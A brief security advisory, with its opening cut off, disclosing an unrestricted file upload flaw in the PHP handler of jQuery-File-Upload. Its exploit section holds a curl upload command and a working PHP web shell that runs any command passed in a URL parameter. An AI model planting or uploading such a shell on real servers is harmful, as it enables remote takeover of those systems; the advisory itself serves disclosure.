Cashdollar, @_larry0 Date: Download Site: https://github.com/blueimp/jQuery-File-Upload/ Vendor: https://github.com/blueimp Vendor Notified: Vendor Contact: Advisory: Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads. Vulnerability: The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.   Exploit Code: $ curl -F "files=@...ll.php"  Where shell.php is:  <?php   $cmd=$_GET['cmd'];   system($cmd);  ?> Screen Shots: Notes: Actively being exploited in the wild.
